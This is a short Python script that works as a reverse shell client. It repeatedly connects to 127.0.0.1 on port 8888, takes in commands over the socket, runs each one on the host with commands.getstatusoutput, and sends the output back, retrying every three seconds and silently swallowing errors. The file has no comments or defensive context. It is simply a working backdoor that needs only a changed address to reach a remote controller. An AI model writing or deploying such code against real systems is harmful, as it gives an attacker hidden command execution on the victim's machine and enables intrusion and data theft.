from socket import socket
import time
import sys
import commands

client = socket()

def loop():
	while 1:
		command = client.recv(1024)
		output = commands.getstatusoutput(command)[1]
		client.sendall(output)

def main():
	while 1:
		try:
			client.connect(('127.0.0.1', 8888))
			loop()
		except:
			pass
		time.sleep(3)

if __name__ == '__main__':
    main()
